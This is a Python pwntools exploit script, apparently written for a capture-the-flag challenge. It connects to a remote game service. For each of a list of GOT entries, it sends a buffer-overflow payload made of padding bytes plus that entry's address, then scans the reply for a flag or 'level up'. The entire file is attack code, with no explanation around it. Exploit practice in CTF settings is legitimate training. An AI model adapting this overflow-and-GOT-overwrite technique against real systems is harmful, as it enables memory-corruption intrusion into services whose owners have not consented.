#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

got_entries = {
    "strcpy": 0x404018,
    "puts": 0x404020,
    "printf": 0x404028,
    "fgets": 0x404030,
    "strcmp": 0x404038,
    "malloc": 0x404040,
    "fflush": 0x404048,
    "fopen": 0x404050,
    "scanf": 0x404058,
    "exit": 0x404060,
    "rand": 0x404068,
}

for name, addr in got_entries.items():
    print(f"\nTrying {name}@GOT (0x{addr:x})...")
    try:
        r = remote("pwn.jeanne-hack-ctf.org", 9004, level='error')
        r.recvuntil(b"First player name :")
        
        payload1 = b"A" * 8 + b"B" * 8 + b"C" * 8 + p64(addr)
        r.sendline(payload1)
        
        r.recvuntil(b"Second player name :", timeout=1)
        r.sendline(b"TESTINPUT")
        
        result = r.recvall(timeout=2)
        if b"flag" in result or b"level up" in result or b"defeat" in result:
            print(f"SUCCESS with {name}!")
            print(result.decode(errors='ignore'))
        else:
            print(f"Normal output: {result[:50]}")
        r.close()
    except Exception as e:
        print(f"Error: {e}")
